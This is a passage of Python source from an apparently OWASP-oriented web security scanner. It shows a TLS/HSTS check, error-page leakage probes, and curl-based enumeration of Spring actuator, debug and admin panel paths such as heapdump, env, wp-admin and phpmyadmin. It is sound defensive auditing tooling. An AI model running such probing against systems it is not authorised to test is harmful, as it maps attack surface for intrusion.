                    hsts_value = line.split(":", 1)[1].strip()
                    # Check max-age
                    max_age_match = re.search(r"max-age=(\d+)", hsts_value)
                    if max_age_match:
                        max_age = int(max_age_match.group(1))
                        if max_age < 31536000:  # Less than 1 year
                            findings.append({
                                "type": "tls_hsts_short",
                                "max_age": max_age,
                                "severity": "low",
                                "note": f"HSTS max-age is {max_age}s (recommended: 31536000)",
                            })
                    break
            if not hsts_found:
                findings.append({
                    "type": "tls_no_hsts",
                    "severity": "medium",
                    "note": "HSTS header not found — connection can be downgraded to HTTP",
                })

        return {
            "target": target,
            "domain": domain,
            "port": port,
            "type": "tls_ssl_security",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Security Logging Tester (A09: Security Logging and Monitoring Failures)
# --------------------------------------------------------------------------- #

class SecurityLoggingTester:
    """Security logging and monitoring testing."""

    def test(self, target, url):
        """Test for security logging and monitoring issues."""
        findings = []

        # Test if security events trigger alerts
        # Test 1: Trigger a 404 and check if custom error page leaks info
        rc, stdout, _ = _run(
            ["curl", "-s", "--max-time", "5", f"{url}/nonexistent-page-12345"],
            timeout=10,
        )
        if rc == 0 and stdout:
            # Check for stack traces
            if any(indicator in stdout.lower() for indicator in ["stack trace", "traceback", "exception", "error in", "line ", "file "]):
                findings.append({
                    "type": "information_disclosure",
                    "note": "Stack trace or error details exposed on 404 page",
                    "severity": "medium",
                })

        # Test 2: Trigger a 500 error
        rc, stdout, _ = _run(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", "{invalid json", "--max-time", "5", url],
            timeout=10,
        )
        if rc == 0 and stdout:
            if any(indicator in stdout.lower() for indicator in ["fatal", "parse error", "syntax error", "unexpected"]):
                findings.append({
                    "type": "error_handling",
                    "note": "Detailed error messages exposed on malformed input",
                    "severity": "low",
                })

        # Test 3: Check for debug endpoints
        debug_endpoints = [
            "/debug",
            "/actuator",
            "/actuator/env",
            "/actuator/health",
            "/actuator/metrics",
            "/actuator/trace",
            "/actuator/beans",
            "/actuator/configprops",
            "/actuator/loggers",
            "/actuator/threaddump",
            "/actuator/heapdump",
            "/actuator/httptrace",
            "/actuator/mappings",
            "/actuator/scheduledtasks",
            "/env",
            "/trace",
            "/health",
            "/info",
            "/metrics",
            "/swagger-ui.html",
            "/v2/api-docs",
            "/v3/api-docs",
            "/api-docs",
            "/actuator/sessions",
            "/actuator/conditions",
            "/auditevents",
            "/flyway",
            "/liquibase",
            "/logfile",
            "/prometheus",
        ]
        for endpoint in debug_endpoints:
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "3", f"{url}{endpoint}"],
                timeout=5,
            )
            if rc == 0 and stdout.strip() == "200":
                findings.append({
                    "type": "debug_endpoint_exposed",
                    "endpoint": endpoint,
                    "severity": "medium",
                })

        # Test 4: Check for common admin panels
        admin_endpoints = [
            "/admin",
            "/admin/login",
            "/administrator",
            "/wp-admin",
            "/wp-login.php",
            "/phpmyadmin",
            "/manager/html",
            "/console",
            "/dashboard",
            "/cpanel",
            "/control",
            "/backend",
            "/staff",
            "/moderator",
        ]
        for endpoint in admin_endpoints:
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "3", f"{url}{endpoint}"],
                timeout=5,
            )
            if rc == 0 and stdout.strip() in ["200", "301", "302", "403"]:
                findings.append({
                    "type": "admin_panel_exposed",
                    "endpoint": endpoint,
                    "status": stdout.strip(),
                    "severity": "low",
                })

        return {
            "target": target,
            "url": url,
            "type": "security_logging_monitoring",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Helper function (needed by all classes)
# --------------------------------------------------------------------------- #

def _run(cmd, timeout=60, input=None):
    """Run a command, returning (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, input=input
        )
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return -1, "", f"{cmd[0]} not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timed out"
    except Exception as exc:
        return -1, "", str(exc)
